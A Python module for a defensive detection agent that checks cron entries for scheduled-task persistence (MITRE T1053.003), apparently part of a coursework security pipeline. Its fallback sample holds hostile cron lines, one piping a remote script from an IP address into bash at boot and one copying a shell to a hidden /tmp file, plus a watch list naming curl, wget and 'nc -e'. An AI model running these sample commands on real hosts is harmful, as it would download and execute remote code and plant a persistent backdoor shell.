"""
Installation agent -- fourth agent in the kill chain (see the build guide).

Detection behaviour (kept to exactly ONE per the Week 6-7 scope cap):
    Inspect a scheduled-task/cron entry for persistence indicators
    commonly used by attackers to survive reboot (MITRE T1053.003,
    Scheduled Task/Job: Scheduled Task).

Run it directly for a quick local test (writes to installation_alerts.jsonl,
does not touch Wazuh yet). `target` is a label identifying the scheduled
task sample -- if a matching file exists at tasks/<target>.txt it is read
as the telemetry, otherwise a canned suspicious-task sample is used so the
pipeline is testable before real crontab/schtasks polling is wired up:

    python -m agents.installation_agent sample-task-01
"""

from __future__ import annotations

import subprocess
import sys
from pathlib import Path

from agents.base_agent import BaseDetectionAgent
from agents.remote import collect_remote, demo_mode, no_telemetry_marker

# Cheap, high-signal indicators for a first MVP detection. Expand this
# list only after the Week 10 validation gate passes.
WATCHED_INDICATORS = [
    "/tmp/",
    "/dev/shm/",
    "curl",
    "wget",
    "chmod +x",
    "nc -e",
    "base64 -d",
    "@reboot",
]


class InstallationAgent(BaseDetectionAgent):
    def __init__(self, agent_ip: str, log_path: str = "installation_alerts.jsonl") -> None:
        super().__init__(
            agent_id="040",
            agent_name="Installation_Agent",
            agent_ip=agent_ip,
            mitre_technique="T1053.003",
            mitre_tactic="Persistence",
            log_path=log_path,
        )

    def collect_telemetry(self, target: str) -> str:
        """Read a sample scheduled-task entry. Prefers a saved sample file
        (see module docstring); falls back to the host's own crontab if
        no sample exists and `target` looks like it wants live data;
        finally falls back to a canned suspicious sample so the pipeline
        is testable before real cron/schtasks polling is wired up.
        """
        sample_path = Path("tasks") / f"{target}.txt"
        if sample_path.exists():
            return sample_path.read_text(encoding="utf-8")

        # Live remote collection over SSH (Stage 3).
        remote = collect_remote(["crontab", "-l"])
        if remote:
            return remote

        try:
            result = subprocess.run(
                ["crontab", "-l"], capture_output=True, text=True, timeout=10, check=False,
            )
            if result.returncode == 0 and result.stdout.strip():
                return result.stdout
        except (FileNotFoundError, subprocess.TimeoutExpired):
            pass

        # Live eval: an empty/unreachable source is benign, not an
        # attack. Only fall through to the canned sample in demo mode.
        if not demo_mode():
            return no_telemetry_marker("cron entries")

        # Fallback sample so the pipeline is testable before cron/schtasks
        # polling is set up.
        return (
            "@reboot curl -s http://45.33.12.9/update.sh | bash\n"
            "* * * * * /bin/bash -c 'cp /bin/bash /tmp/.hidden; "
            "chmod +x /tmp/.hidden'\n"
            "(sample data -- no real cron/schtasks polling configured yet)\n"
        )

    def build_task_description(self, telemetry: str, target: str) -> str:
        watched = ", ".join(f'"{w}"' for w in WATCHED_INDICATORS)
        return (
            f"Here are scheduled-task/cron entries found on host {target}:\n\n"
            f"{telemetry}\n\n"
            f"Watched persistence indicators for this agent: {watched}.\n"
            "Determine whether any entry shows signs of malicious "
            "persistence (running from a world-writable temp directory, "
            "downloading and executing remote payloads, copying a shell "
            "to a hidden path, running at every boot/minute with no "
            "legitimate business purpose). If one does, treat it as "
            "suspicious scheduled-task persistence (MITRE T1053.003, "
            "Scheduled Task/Job: Scheduled Task)."
        )


def main() -> None:
    if len(sys.argv) != 2:
        print("Usage: python -m agents.installation_agent <task-label>")
        raise SystemExit(1)
    target = sys.argv[1]

    agent = InstallationAgent(agent_ip="127.0.0.1")  # replace with this VM's real Tailscale IP
    alert = agent.run_once(target=target, category="scheduled_task_persistence")
    print(f"Wrote alert to {agent.log_path}:")
    print(alert.to_json())


if __name__ == "__main__":
    main()
